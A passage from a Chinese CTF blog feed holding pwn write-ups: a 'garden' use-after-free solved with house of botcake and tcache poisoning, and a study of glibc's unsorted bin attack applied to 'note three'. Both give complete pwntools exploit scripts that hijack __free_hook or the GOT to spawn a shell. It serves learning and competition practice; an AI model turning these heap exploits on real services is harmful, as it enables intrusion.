class="hljs-number">0</span>)*<span class="hljs-number">7</span>)create()<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/9UJXcK.png" srcset="/img/loading.gif" alt><br>flag{807591828e94ceb0e6c206caa5f98927}</p><h2 id="garden"><a href="#garden" class="headerlink" title="garden"></a>garden</h2><h3 id="漏洞点-4"><a href="#漏洞点-4" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>steal tree函数存在uaf</li></ul><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>研究程序逻辑后，发现基本就是<code>house_ of_ botcake</code>的进阶利用版。</p><p>所以核心思路就是 <code>house of botcake</code>，但是由于没有能够申请更大的chunk来利用，所以需要用进tcache的chunk来做padding chunk，然后用name那个函数的malloc 0x20，切割一下生成的unsortedbin。</p><p>接着就简单了，也就是释放完heap无用残余指针，然后多次申请，和适当的free堆，来改unsortbin上重叠tcache的堆头，来实现tcache attack，接着打free hook。</p><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'8.131.69.237'</span>,<span class="hljs-number">32452</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex?'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-comment">#  only one</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex?\n'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">steal</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'5'</span>)    sla(<span class="hljs-string">'tree'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'6'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(i,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">8</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-comment"># name()</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):    free(i)free(<span class="hljs-number">8</span>)free(<span class="hljs-number">5</span>)steal(<span class="hljs-number">7</span>)free(<span class="hljs-number">6</span>)show(<span class="hljs-number">7</span>)<span class="hljs-comment"># r()</span><span class="hljs-comment">#  p/x 0x00007fd1efd50ca0 - 0x00007fd1efb6c000</span>libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1e4ca0</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)add(<span class="hljs-number">0</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">7</span>)name()free(<span class="hljs-number">0</span>)<span class="hljs-comment"># debug()</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    add(i,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-comment"># free(0)</span>add(<span class="hljs-number">8</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">8</span>)__malloc_hook = <span class="hljs-number">0x1e4c30</span>__free_hook = <span class="hljs-number">0x1e75a8</span>one = p64(<span class="hljs-number">0x52fd0</span>+libcbase)payload = <span class="hljs-number">0xd0</span> * <span class="hljs-string">'\x00'</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x111</span>) + p64(<span class="hljs-number">0x1e75a8</span> + libcbase)add(<span class="hljs-number">8</span>,payload)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(<span class="hljs-number">7</span>-i+<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    add(i,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">7</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">8</span>,one)add(<span class="hljs-number">6</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">6</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/wNb41v.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">flag&#123;<span class="hljs-number">49333188</span>b93b530dfaf568d0816aa0fa&#125;</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Unsorted\_Bin\_Attack再学习</title>
    <link href="/2020/11/18/Unsorted_Bin_Attack%E5%86%8D%E5%AD%A6%E4%B9%A0/"/>
    <url>/2020/11/18/Unsorted_Bin_Attack%E5%86%8D%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Unsorted-Bin-Attack-再学习"><a href="#Unsorted-Bin-Attack-再学习" class="headerlink" title="Unsorted_Bin_Attack  再学习"></a><code>Unsorted_Bin_Attack</code>  再学习</h1><p>感觉自己对<code>Unsorted_Bin_Attack</code>掌握的不是很好，最初学习时，也没有对着源码进行学习分析。决定再总结和学习一下。</p><h2 id="基本来源和知识"><a href="#基本来源和知识" class="headerlink" title="基本来源和知识"></a>基本来源和知识</h2><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 <code>malloc_consolidate</code>时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 紧邻的话。</li></ul><h3 id="使用时的情况"><a href="#使用时的情况" class="headerlink" title="使用时的情况"></a>使用时的情况</h3><ul><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li><li>unsorted bin遍历堆块的时候使用的是bk指针</li></ul><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*     Process recently freed or remaindered chunks, taking one only if     it is exact fit, or, if this a small request, the chunk is remainder from     the most recent non-exact fit.  Place other traversed chunks in     bins.  Note that this step is the only place in any routine where     chunks are placed in bins. 进程最近释放的或剩余的chunks，仅在完全匹配的情况下才取走，或者，如果请求的字节很小，  则会选择最近一次非完全匹配的剩余chunk。将其他遍历的chunk分别插入到对应的 bin 中。  请注意，在任何例程中，此步骤是惟一一个将 chunk 放入对应的 bin 中的位置的步骤。     The outer loop here is needed because we might not realize until     near the end of malloc that we should have consolidated, so must     do so and retry. This happens at most once, and only when we would     otherwise need to expand memory to service a "small" request. 这里需要外部循环的因为是：  我们可能直到接近malloc函数的末尾才可能意识到应该进行chunk合并，  所以我们必须反复尝试。这种情况最多只发生一次，并且只有当我们想这样做时才会发生，  否则，需要扩展内存来处理“小”请求。（分割top chunk之类的）   */</span>  <span class="hljs-keyword">for</span> (;; )    &#123;      <span class="hljs-keyword">int</span> iters = <span class="hljs-number">0</span>;      <span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) <span class="hljs-comment">//从unsortbin第一个chunk（队尾）开始顺着bk指针向前遍历,其进行简单的判断，倘若不相等，证明unsortedbin中还存在chunk，则进入unsortedbin相关处理的循环。</span>        &#123;          bck = victim-&gt;bk; <span class="hljs-comment">//bck是倒数第二个，victim是倒数第一个</span>          <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))            malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,                             chunk2mem (victim), av); <span class="hljs-comment">//victim的size位进行检查，这个约束比较宽松，计算得到chunk实际大小</span>          size = chunksize (victim);  <span class="hljs-comment">////取出victim的size</span></code></pre></div><p>接着是常遇到的情况，但是在unsortedbin attack中，bck被修改，这块代码并不会被执行：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/*             If a small request, try to use last remainder if it is the             only chunk in unsorted bin.  This helps promote locality for             runs of consecutive small requests. This is the only             exception to best-fit, and applies only when there is             no exact fit for a small chunk.  如果申请一个小的size，并且unsorted bin仅剩最后一个chunk时，会尝试使用该chunk        这有助于为连续的申请小size的行为提升局部性。这是best-fit的唯一例外，        并且只适用于没有对一个小size申请的情况。           */</span><span class="hljs-comment">/*假如我们申请的chunk属于small bin的范围，且last remainder是unsorted bin的唯一一个chunk时，  我们优先使用这个块，如果该块满足条件则对其进行切割和解链操作。*/</span>  <span class="hljs-comment">/* 显然，bck被修改，并不符合这里的要求，不会进入其中的代码*/</span>          <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;              bck == unsorted_chunks (av) &amp;&amp;              victim == av-&gt;last_remainder &amp;&amp;              (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE))            &#123;              <span class="hljs-comment">/* split and reattach remainder   分割或者将剩余的chunk合并 */</span>              remainder_size = size - nb;              remainder = chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;              av-&gt;last_remainder = remainder;              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);              <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))                &#123;                  remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;                  remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;                &#125;              set_head (victim, nb | PREV_INUSE |                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);              alloc_perturb (p, bytes);              <span class="hljs-keyword">return</span> p;            &#125;</code></pre></div><p>接着到了unsortedbin attack的关键处：</p><div class="hljs"><pre><code class="hljs c">          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//unsorted_chunks (av)这里就是victim即最后一个chunk，当我们可以控制victim的bk指针时（即bck）</span>      <span class="hljs-comment">//就可以往bck-&gt;fd写入unsorted_chunks(av)即*(bck+0x10)=unsorted(av)</span>      <span class="hljs-comment">//要求bck是一个可写的地址，否则会crush</span></code></pre></div><p>其也就是<code>*(bck+0x10)=unsorted(av)</code>，倘若篡改bk指针为<code>目标地址-0x10</code>，利用这里可以往目标处写入一个巨大的值。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/FQa72u.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs undefined">（抄ScUpax0s师傅的图）</code></pre></div><p>代码继续走，下面一个代码块是指如果我们请求的nb同victim的大小恰好吻合，就直接返回这个块给用户。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (size == nb)           &#123;             set_inuse_bit_at_offset (victim, size);             <span class="hljs-keyword">if</span> (av != &amp;main_arena)               victim-&gt;size |= NON_MAIN_ARENA;             check_malloced_chunk (av, victim, nb);             <span class="hljs-keyword">void</span> *p = chunk2mem (victim);             alloc_perturb (p, bytes);             <span class="hljs-keyword">return</span> p;           &#125;</code></pre></div><p>然后，如果之前的条件都不满足，意味着目前的victim不能满足用户的需求，需要根据其size放入small bin或large bin的链。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>触发时的申请的size要和free掉的size一样，否则将unsorted bin中的chunk放回对应的bin后，unsort bin的连续性会被破坏，也就过不了下面的check。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)            || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))          malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,</code></pre></div><p>当原来申请chunk时，size刚好于unsortedbin相同：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (size == nb)  &#123;    set_inuse_bit_at_offset (victim, size);    <span class="hljs-keyword">if</span> (av != &amp;main_arena)      victim-&gt;size |= NON_MAIN_ARENA;    check_malloced_chunk (av, victim, nb);    <span class="hljs-keyword">void</span> *p = chunk2mem (victim);    alloc_perturb (p, bytes);    <span class="hljs-keyword">return</span> p;  &#125;</code></pre></div><p>首先设置当前chunk 处于 inuse 状态，该标志位处于相邻的下一个 chunk 的 size 字段中。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_inuse_bit_at_offset(p, s)      \  (((mchunkptr) (((char *) (p)) + (s)))-&gt;size |= PREV_INUSE)</span></code></pre></div><p>最后调用 chunk2mem()获得 chunk 中可用的内存指针，返回给应用层，退出。 就不会出现上面的错误。</p><h2 id="黄鹤杯-note-three"><a href="#黄鹤杯-note-three" class="headerlink" title="黄鹤杯 note three"></a>黄鹤杯 note three</h2><p>基本国赛原题，no free，所以此处就只记录用unsortedbin attack打。</p><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><p>存在堆溢出，没有free show功能，先可以用HOF 改掉top size，借助多次分配让其进入unsortedbin，然后进行unsortedbin attack。</p><h3 id="难点细节"><a href="#难点细节" class="headerlink" title="难点细节"></a>难点细节</h3><h4 id="难点1"><a href="#难点1" class="headerlink" title="难点1"></a>难点1</h4><p>HOF改size后，多次申请让top chunk 进unsorted bin。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (old_size != <span class="hljs-number">0</span>)  &#123;    <span class="hljs-comment">/*       Shrink old_top to insert fenceposts, keeping size a       multiple of MALLOC_ALIGNMENT. We know there is at least       enough space in old_top to do this.     */</span>    old_size = (old_size - <span class="hljs-number">4</span> * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK; <span class="hljs-comment">//top chunk's old size -0x20</span>    set_head (old_top, old_size | PREV_INUSE);<span class="hljs-comment">/*   Note that the following assignments completely overwrite   old_top when old_size was previously MINSIZE.  This is   intentional. We need the fencepost, even if old_top otherwise gets   lost. */</span>    chunk_at_offset (old_top, old_size)-&gt;size =    (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;    chunk_at_offset (old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ)-&gt;size =    (<span class="hljs-number">2</span> * SIZE_SZ) | PREV_INUSE;  <span class="hljs-comment">/* If possible, release the rest. */</span>      <span class="hljs-keyword">if</span> (old_size &gt;= MINSIZE)        &#123;            _int_free (av, old_top, <span class="hljs-number">1</span>); <span class="hljs-comment">//old_size =top chunk size - 0x20</span>        &#125;    &#125;</code></pre></div><p>首先申请一个chunk，倘若top chunk 的size减去这个chunk的size &gt;=MINSIZE，其就正常的切割。<br>否则，其会告诉系统top chunk已经不够用了，需要申请一个新的内存页。<br>对于旧的top chunk的处理，会进入如上流程，可以看到在旧的top chunk  size在 减去0x20后，倘若其是大于0x20的，就会被放入bin中。</p><p>倘若起大于0x80，就会被放入unsorted bin，也是为接下来攻击做准备。</p><h4 id="难点2"><a href="#难点2" class="headerlink" title="难点2"></a>难点2</h4><p>Unsortedbin attack如前面所示，也就可以实现往一个地址写上一个main arenas的地址，仅使用这个地址是怎么能完成拿shell的攻击的。先看下其写入的地址信息：</p><div class="hljs"><pre><code class="hljs c">gef➤  x/<span class="hljs-number">30</span>gx <span class="hljs-number">0x00007f99bb194b78</span><span class="hljs-number">0x7f99bb194b78</span> &lt;main_arena+<span class="hljs-number">88</span>&gt;: <span class="hljs-number">0x0000000000602030</span>      <span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x7f99bb194b88</span> &lt;main_arena+<span class="hljs-number">104</span>&gt;:        <span class="hljs-number">0x0000000001cccf50</span>      <span class="hljs-number">0x00000000006021b0</span><span class="hljs-number">0x7f99bb194b98</span> &lt;main_arena+<span class="hljs-number">120</span>&gt;:        <span class="hljs-number">0x00007f99bb194b88</span>      <span class="hljs-number">0x00007f99bb194b88</span><span class="hljs-number">0x7f99bb194ba8</span> &lt;main_arena+<span class="hljs-number">136</span>&gt;:        <span class="hljs-number">0x00007f99bb194b98</span>      <span class="hljs-number">0x00007f99bb194b98</span><span class="hljs-number">0x7f99bb194bb8</span> &lt;main_arena+<span class="hljs-number">152</span>&gt;:        <span class="hljs-number">0x00007f99bb194ba8</span>      <span class="hljs-number">0x00007f99bb194ba8</span><span class="hljs-number">0x7f99bb194bc8</span> &lt;main_arena+<span class="hljs-number">168</span>&gt;:        <span class="hljs-number">0x00007f99bb194bb8</span>      <span class="hljs-number">0x00007f99bb194bb8</span></code></pre></div><p>会发现其写入的是<code>main_arena+88</code>，这紧邻着就是<code>top chunk last_remainder unsortedbin&#39;s fd bk</code></p><p>事情就变得有意思起来，这块top chunk已经废了（并没有办法将其设置为合适的值来进行利用），<code>last_remainder</code>用途不是很大，<strong>unsortedbin’s fd 和bk 设置好的话，可以伪造出一个unsorted bin，接着再申请相同大小的chunk，即可拿到这个伪造的unsorted bin</strong>。</p><p>其中需要注意的是仍需要绕过unsortbin 一些检查，其中很重要的检查就是保证fake unsorted bin的bck<strong>需要是一个可写的地址</strong>。这点也很容易做到，我们的输入首先会放在bss上，完全可以通过输入来伪造<code>fake_ unsorted bin</code>及其bk对应的堆块。</p><p>所以，先利用unsortbin attack往heaplist上打上<code>main_arena+88</code>，然后edit来控制<code>main_arena+88</code>附近的内存，伪造出一个unsorted bin，其指向heaplist 附近，目标也就是控制到heaplist。</p><p>然后在申请chunk时，用往bss段写的数据，来通过相关检查，接着获得一个在heaplist附近的chunk。利用这样的unsortbin attack来完成攻击。</p><p>剩下的就好说了，可以看exp。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./note_three'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,content)</span>:</span>    io.recvuntil(<span class="hljs-string">'choice&gt;&gt; '</span>)    io.sendline(<span class="hljs-string">'1'</span>)    io.recvuntil(<span class="hljs-string">"idx: "</span>)    io.sendline(str(idx))    io.recvuntil(<span class="hljs-string">"size: "</span>)    io.sendline(str(size))    io.recvuntil(<span class="hljs-string">"content: "</span>)    io.send(str(content))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,content)</span>:</span>    io.recvuntil(<span class="hljs-string">'choice&gt;&gt; '</span>)    io.sendline(<span class="hljs-string">'2'</span>)    io.recvuntil(<span class="hljs-string">"idx: "</span>)    io.sendline(str(idx))    io.recvuntil(<span class="hljs-string">"content: "</span>)    io.send(str(content))add(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x18</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x28</span> + p64(<span class="hljs-number">0xfd1</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x17</span>):    add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x90</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x70</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x30</span>) <span class="hljs-comment">#切割用，切割后 top chunk 0xb1</span>debug()add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x90</span>)debug()payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x38</span> + p64(<span class="hljs-number">0x91</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x6021b0</span>)edit(<span class="hljs-number">2</span>,payload)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x80</span>) <span class="hljs-comment">#申请和进入unsortedbin大小一样的chunk</span><span class="hljs-comment"># add(1,0x90,'1'*0x81)</span>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x6020c0</span>+<span class="hljs-number">0x70</span>)*<span class="hljs-number">2</span>) <span class="hljs-comment">#伪造main_arena+88 其中top chunk的地址并不重要，写0即可，重要是伪造unsortedbin</span>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x78</span> +p64(<span class="hljs-number">0x91</span>)+p64(<span class="hljs-number">0x6021b0</span>)*<span class="hljs-number">2</span>)debug()<span class="hljs-comment">#攻击heaplist 实现任意地址写</span>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0x6021c0</span>)edit(<span class="hljs-number">2</span>,payload)edit(<span class="hljs-number">0</span>,p64(elf.got[<span class="hljs-string">'atoi'</span>]) + p64(<span class="hljs-number">0x90</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>])+p64(<span class="hljs-number">0x90</span>) + p64(elf.got[<span class="hljs-string">'atoi'</span>]))edit(<span class="hljs-number">0</span>,p64(elf.plt[<span class="hljs-string">'printf'</span>]))sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)payload = <span class="hljs-string">'aaaa%7$s'</span> + p64(<span class="hljs-number">0x000000000602018</span>)sa(<span class="hljs-string">'idx'</span>,payload)r(<span class="hljs-number">4</span>)r(<span class="hljs-number">4</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'puts'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sys = libc_base + libc.sym[<span class="hljs-string">'system'</span>]<span class="hljs-comment"># debug()</span>edit(<span class="hljs-number">1</span>,p64(sys))s(<span class="hljs-string">'sh'</span>)itr()</code></pre></div><h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p>此题这样的利用手法，十分的精巧和新奇，但是也十分依赖程序本身申请chunk的特性，使其成了其不是大众攻击的手段。</p><h2 id="总结用途"><a href="#总结用途" class="headerlink" title="总结用途"></a>总结用途</h2><ul><li>通过修改循环的次数来使得程序可以执行多次循环。</li><li>可以修改 heap 中的<code>global_max_fast</code> 来使得更大的 chunk 可以被视为 fast bin，去执行一些 fast bin attack </li><li>作为FSOP的前奏</li><li>在可编辑的时候，劫持<code>main_arena+88</code> 也是一种新奇的攻击手段</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
